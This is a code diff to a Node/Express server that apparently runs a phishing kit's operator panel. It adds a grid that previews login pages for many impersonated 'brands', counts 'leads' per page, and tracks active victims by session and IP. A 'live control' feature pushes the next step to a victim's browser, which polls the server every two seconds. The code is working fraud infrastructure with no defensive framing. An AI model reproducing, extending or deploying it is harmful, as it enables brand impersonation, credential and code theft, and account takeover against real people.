@@ -89,6 +89,59 @@ function getNextPage(tpl, currentSlug) {
   return idx >= 0 && idx < tpl.pages.length - 1 ? tpl.pages[idx + 1] : null;
 }
 
+// BRAND GRID — visual review of all brands
+app.get('/preview', isAdmin, (req, res) => {
+  const cats = getCategories();
+  const byCategory = cats.map(cat => ({
+    ...cat,
+    brands: getTemplatesByCategory(cat.id).map(t => ({ key: t.key, name: t.name }))
+  }));
+  res.send(`<!doctype html><html><head><meta charset="utf-8">
+<title>Brand Grid</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui;background:#0b0f19;color:#eef2ff;padding:20px}
+h1{font-size:1.3rem;margin-bottom:20px;color:#8ab4ff}
+.cat-title{font-size:.9rem;color:#5b8cff;font-weight:700;margin:24px 0 10px;text-transform:uppercase;letter-spacing:.08em}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:8px}
+.card{border-radius:8px;overflow:hidden;border:1px solid #ffffff15;background:#151b2b;cursor:pointer;transition:border-color .2s}
+.card:hover{border-color:#5b8cff}
+.card-label{padding:6px 10px;font-size:.72rem;color:#8ab4ff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;border-bottom:1px solid #ffffff10}
+iframe{width:100%;height:220px;border:none;pointer-events:none}
+</style></head><body>
+<h1>🎨 Brand Grid Preview — ${byCategory.reduce((s,c)=>s+c.brands.length,0)} brands</h1>
+${byCategory.map(cat => `
+<div class="cat-title">${cat.name} (${cat.brands.length})</div>
+<div class="grid">
+${cat.brands.map(b => `<div class="card" onclick="window.open('/preview/${b.key}','_blank')">
+  <div class="card-label">${b.key}</div>
+  <iframe src="/preview/${b.key}" loading="lazy"></iframe>
+</div>`).join('')}
+</div>`).join('')}
+</body></html>`);
+});
+
+// BRAND PREVIEW (dev/admin only - shows login.ejs for any brand key)
+app.get('/preview/:brandKey', isAdmin, (req, res) => {
+  try {
+    const { brandKey } = req.params;
+    // find matching template by key
+    const cats = getCategories();
+    let tpl = null;
+    for (const cat of cats) {
+      const list = getTemplatesByCategory(cat.id);
+      tpl = list.find(t => t.key === brandKey);
+      if (tpl) break;
+    }
+    if (!tpl) return res.status(404).send(`Brand "${brandKey}" not found`);
+    const pageContent = tpl.pages[0];
+    const fakePage = { id: 0, slug: 'preview', title: tpl.name, mode: 'online', active: 1 };
+    res.render('login', { page: fakePage, tpl, pageContent, allPages: tpl.pages, csrfToken: 'preview', logos: LOGOS });
+  } catch(err) {
+    res.status(500).send(err.message);
+  }
+});
+
 // PUBLIC ROUTES
 app.get('/', (req, res) => res.redirect('/admin'));
 
@@ -543,6 +596,142 @@ if (process.env.NODE_ENV !== 'production') {
     res.json({ code: code || 'not found — check console', slug: req.params.slug });
   });
 }
+
+// ═══════════════════════════════════════════════════════════
+// ADMIN JSON APIs (for dashboard Live Control + Arranger)
+// ═══════════════════════════════════════════════════════════
+
+// GET all pages (no pagination) for arranger
+app.get('/admin/api/pages-all', isAdmin, (req, res) => {
+  try {
+    const pages = db.prepare(`
+      SELECT p.*, (SELECT COUNT(*) FROM leads l WHERE l.page_id=p.id) AS leads_count
+      FROM pages p ORDER BY p.sort_order ASC, p.id DESC
+    `).all();
+    pages.forEach(p => { p.template_name = getTemplate(p.template_id).name; });
+    res.json(pages);
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Toggle active (JSON)
+app.post('/admin/api/toggle-active/:id', isAdmin, (req, res) => {
+  try {
+    const p = db.prepare('SELECT active FROM pages WHERE id=?').get(req.params.id);
+    if (!p) return res.status(404).json({ error: 'not found' });
+    const active = p.active ? 0 : 1;
+    db.prepare('UPDATE pages SET active=? WHERE id=?').run(active, req.params.id);
+    res.json({ ok: true, active });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Toggle mode (JSON)
+app.post('/admin/api/toggle-mode/:id', isAdmin, (req, res) => {
+  try {
+    const p = db.prepare('SELECT mode FROM pages WHERE id=?').get(req.params.id);
+    if (!p) return res.status(404).json({ error: 'not found' });
+    const mode = p.mode === 'offline' ? 'online' : 'offline';
+    db.prepare('UPDATE pages SET mode=? WHERE id=?').run(mode, req.params.id);
+    res.json({ ok: true, mode });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Reorder pages (drag & drop)
+app.post('/admin/api/reorder', isAdmin, (req, res) => {
+  try {
+    const { from, to } = req.body;
+    const all = db.prepare('SELECT id FROM pages ORDER BY sort_order ASC, id DESC').all().map(r => r.id);
+    const fromIdx = all.indexOf(parseInt(from));
+    const toIdx   = all.indexOf(parseInt(to));
+    if (fromIdx < 0 || toIdx < 0) return res.status(400).json({ error: 'invalid ids' });
+    all.splice(toIdx, 0, all.splice(fromIdx, 1)[0]);
+    const upd = db.prepare('UPDATE pages SET sort_order=? WHERE id=?');
+    const tx = db.transaction(() => all.forEach((id, idx) => upd.run(idx, id)));
+    tx();
+    res.json({ ok: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// GET active visitors (live control)
+app.get('/admin/api/visitors', isAdmin, (req, res) => {
+  try {
+    const cutoff = new Date(Date.now() - 10*60*1000).toISOString();
+    const visitors = db.prepare('SELECT * FROM visitors WHERE last_seen > ? ORDER BY last_seen DESC').all(cutoff);
+    // attach available steps for each visitor's page
+    const result = visitors.map(v => {
+      let steps = [];
+      try {
+        const p = db.prepare('SELECT template_id FROM pages WHERE id=?').get(v.page_id);
+        if (p) {
+          const tpl = getTemplate(p.template_id);
+          steps = (tpl.pages||[]).map(pg => ({ slug: pg.slug, label: pg.title || pg.slug }));
+        }
+      } catch {}
+      return { ...v, steps };
+    });
+    res.json(result);
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// POST push step to visitor (live control)
+app.post('/admin/api/push-step', isAdmin, (req, res) => {
+  try {
+    const { session_id, page_id, step } = req.body;
+    if (!session_id) return res.status(400).json({ error: 'missing session_id' });
+    db.prepare(`
+      INSERT INTO visitors (session_id, page_id, pending_step, last_seen)
+      VALUES (?,?,?,datetime('now'))
+      ON CONFLICT(session_id) DO UPDATE SET pending_step=excluded.pending_step, last_seen=excluded.last_seen
+    `).run(session_id, page_id, step);
+    res.json({ ok: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// GET pending step for a visitor session (polled by visitor browser every 2s)
+app.get('/p/:slug/poll', (req, res) => {
+  try {
+    const sid = req.query.sid;
+    if (!sid) return res.json({ step: null });
+    const v = db.prepare('SELECT pending_step FROM visitors WHERE session_id=?').get(sid);
+    const step = v?.pending_step || null;
+    // clear pending after delivery
+    if (step) db.prepare('UPDATE visitors SET pending_step=\'\' WHERE session_id=?').run(sid);
+    res.json({ step: step || null });
+  } catch { res.json({ step: null }); }
+});
+
+// POST heartbeat from visitor (updates last_seen + current_step)
+app.post('/p/:slug/heartbeat', (req, res) => {
+  try {
+    const { sid, step } = req.body;
+    if (!sid) return res.json({ ok: false });
+    const page = db.prepare('SELECT id, title FROM pages WHERE slug=?').get(req.params.slug);
+    if (!page) return res.json({ ok: false });
+    db.prepare(`
+      INSERT INTO visitors (session_id, page_id, page_title, current_step, ip, last_seen)
+      VALUES (?,?,?,?,?,datetime('now'))
+      ON CONFLICT(session_id) DO UPDATE SET current_step=excluded.current_step, last_seen=excluded.last_seen
+    `).run(sid, page.id, page.title, step || 'login', req.ip || '');
+    res.json({ ok: true });
+  } catch { res.json({ ok: false }); }
+});
+
+// GET /p/:slug/next — redirect visitor to next step in flow
+app.get('/p/:slug/next', (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug=?').get(req.params.slug);
+    if (!page) return res.redirect('/p/' + req.params.slug);
+    const tpl = getTemplate(page.template_id);
+    const sid = req.query._sid;
+    let currentStep = 'login';
+    if (sid) {
+      const v = db.prepare('SELECT current_step FROM visitors WHERE session_id=?').get(sid);
+      if (v) currentStep = v.current_step;
+    }
+    const next = getNextPage(tpl, currentStep);
+    if (next) return res.redirect('/p/' + req.params.slug + '/' + next.slug);
+    res.redirect('/p/' + req.params.slug + '/home?complete=1');
+  } catch { res.redirect('/p/' + req.params.slug); }
+});
 
 // BOT
 if (bot) {
